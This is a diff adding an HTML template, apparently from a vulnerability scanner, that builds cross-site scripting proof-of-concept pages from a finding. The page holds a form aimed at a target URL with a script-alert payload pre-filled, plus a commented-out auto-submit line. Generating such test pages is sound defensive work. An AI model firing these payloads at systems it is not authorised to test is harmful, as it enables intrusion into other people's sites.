@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS PoC - {{ finding.title }}</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #f0f0f0; }
+        .warning { color: red; font-weight: bold; }
+        .payload { background: #fff; padding: 10px; border: 1px solid #ccc; }
+    </style>
+</head>
+<body>
+    <h1>XSS Proof of Concept</h1>
+    <p><strong>Finding ID:</strong> {{ finding.finding_id }}</p>
+    <p><strong>File:</strong> {{ finding.file_path }}:{{ finding.line_start }}</p>
+    
+    <div class="warning">
+        ⚠️ WARNING: This is a generated exploit for testing purposes only.
+    </div>
+
+    <h2>Test Payload</h2>
+    <div class="payload">
+        &lt;script&gt;alert('XSS PoC: {{ finding.finding_id }}')&lt;/script&gt;
+    </div>
+
+    <h2>Auto-Submit Form</h2>
+    <!-- Update action to point to the vulnerable endpoint -->
+    <form action="{{ target_url }}" method="GET">
+        <label>Vulnerable Parameter ({{ param_name }}):</label><br>
+        <input type="text" name="{{ param_name }}" value="<script>alert(1)</script>" size="50">
+        <br><br>
+        <input type="submit" value="Trigger XSS">
+    </form>
+
+    <script>
+        // Uncomment to auto-submit
+        // document.forms[0].submit();
+    </script>
+</body>
+</html>
